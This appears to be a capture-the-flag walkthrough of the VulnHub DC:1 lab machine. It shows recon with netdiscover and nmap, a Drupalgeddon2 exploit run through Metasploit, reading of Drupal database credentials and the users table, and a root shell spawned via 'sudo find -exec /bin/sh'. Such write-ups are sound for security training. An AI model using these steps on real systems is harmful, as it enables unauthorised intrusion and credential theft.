<h1>DC:1 VulnHub Walkthrough</h1>

<p>
This is a walkthrough of the DC:1 virtual machine from VulnHub. It’s a beginner-friendly boot-to-root machine designed to test your penetration testing skills, especially in web exploitation. The target uses a vulnerable version of Drupal CMS, which is the main attack vector.
</p>

<h2>🔍 Initial Reconnaissance</h2>

<h3>Network Discovery</h3>
<p>We start by identifying the IP address of the target machine using <code>netdiscover</code>.</p>
<pre>
netdiscover -r 192.168.0.0/24
</pre>
<img src="images/1netdiscover.png" alt="Netdiscover Output" width="600"/>

<h3>Port Scanning with Nmap</h3>
<p>Next, we scan the target using <code>nmap</code> to find open ports and services.</p>
<pre>
nmap -sS -sV -T4 192.168.0.102
</pre>
<img src="images/2nmap.png" alt="Nmap Output" width="600"/>

<h2>🌐 Web Application Enumeration</h2>

<h3>Drupal Site Detected</h3>
<p>Browsing to the IP address reveals a Drupal website. This suggests a possible exploit path.</p>
<img src="images/3drupal_site.png" alt="drupal" width="600"/>

<h3>Recovering Password</h3>
<p>Drupal has a password reset feature which may expose usernames or other useful information.</p>
<img src="images/4recover.png" alt="recover" width="600"/>

<h2>🛠 Exploitation</h2>

<h3>Using Searchsploit to Find Exploits</h3>
<p>We search for known vulnerabilities in Drupal using Searchsploit. A remote code execution (RCE) vulnerability is found.</p>
<pre>
searchsploit drupal 7
</pre>
<img src="images/5search.png" alt="searchsploit" width="600"/>

<h3>Launching Exploit via Metasploit</h3>
<p>We use Metasploit's module for Drupalgeddon2 to exploit the vulnerability and gain a reverse shell.</p>
<img src="images/6meta.png" alt="metasploit" width="600"/>

<h3>Setting the RHOST Parameter</h3>
<pre>
set RHOST 192.168.0.102
run
</pre>
<img src="images/7set_RHOST.png" alt="set" width="600"/>

<h3>Getting a Meterpreter Session</h3>
<p>Successful exploitation results in a Meterpreter session.</p>
<img src="images/8meterpreter.png" alt="meterpreter" width="600"/>

<h3>Post Exploitation - User Info</h3>
<p>Check the user context with <code>getuid</code>.</p>
<img src="getuid.png" alt="getuid command">

<h2>🧾 Flag Collection</h2>

<h3>Flag 1</h3>
<p>We list files in the home directory and retrieve the first flag.</p>
<pre>
ls
cat flag1.txt
</pre>
<img src="ls-cat-flag1.png" alt="flag1 retrieval">

<h3>Finding Flag 4</h3>
<p>Using the <code>find</code> command to locate additional flags.</p>
<pre>
find / -name flag4.txt 2>/dev/null
</pre>
<img src="find-flag4.png" alt="find flag4">

<h3>Viewing Flag 4</h3>
<pre>
cat /var/www/html/sites/default/files/flag4.txt
</pre>
<img src="cat-flag4.png" alt="cat flag4">

<h2>🧩 Drupal Database Analysis</h2>

<h3>Drupal Configuration</h3>
<p>We search for Drupal database credentials in settings.php or other configuration files.</p>
<img src="find-drupal-db.png" alt="Drupal database credentials">

<h3>Accessing MySQL</h3>
<p>We log into MySQL using the credentials found.</p>
<pre>
mysql -u drupal -p
</pre>
<img src="mysql.png" alt="MySQL login">

<h3>Enumerating Users Table</h3>
<p>We look at the <code>users</code> table to see account information.</p>
<pre>
SELECT * FROM users;
</pre>
<img src="users-table.png" alt="Drupal users table">

<h3>Inspecting Node Table</h3>
<p>View the content nodes stored in the Drupal site.</p>
<pre>
SELECT * FROM node;
</pre>
<img src="node-table.png" alt="Drupal node table">

<h2>🔓 Privilege Escalation</h2>

<h3>Find Has Root Permissions</h3>
<p>Running <code>sudo -l</code> reveals that the <code>find</code> command can be executed as root.</p>
<pre>
sudo -l
</pre>
<img src="find-root-perms.png" alt="find command as root">

<h3>Spawning a Root Shell</h3>
<p>We use a known privilege escalation trick with <code>find</code> to get root access.</p>
<pre>
sudo find . -exec /bin/sh \; -quit
</pre>
<img src="find-root-shell.png" alt="find root shell">

<h3>Final Flag</h3>
<p>After getting root access, we find and read the final flag.</p>
<pre>
cat /root/flag.txt
</pre>
<img src="cat-final-flag.png" alt="final flag">
